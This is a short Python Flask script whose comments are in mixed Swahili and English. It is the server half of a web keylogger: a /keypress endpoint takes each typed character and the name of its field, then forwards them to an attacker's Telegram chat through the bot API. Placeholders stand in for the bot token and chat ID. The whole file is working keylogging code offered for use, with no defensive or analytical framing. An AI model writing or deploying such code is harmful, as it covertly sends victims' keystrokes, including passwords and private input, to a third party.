from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = "YOUR_BOT_TOKEN"     # Replace na token yako
CHAT_ID = "YOUR_CHAT_ID"         # Replace na chat ID yako

@app.route("/keypress", methods=["POST"])
def keylogger():
    data = request.get_json()
    field = data.get("field")
    char = data.get("char")

    message = f"⌨️ Keypress from {field}: `{char}`"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }

    requests.post(url, data=payload)
    return "Logged"

if __name__ == "__main__":
    app.run(debug=True)
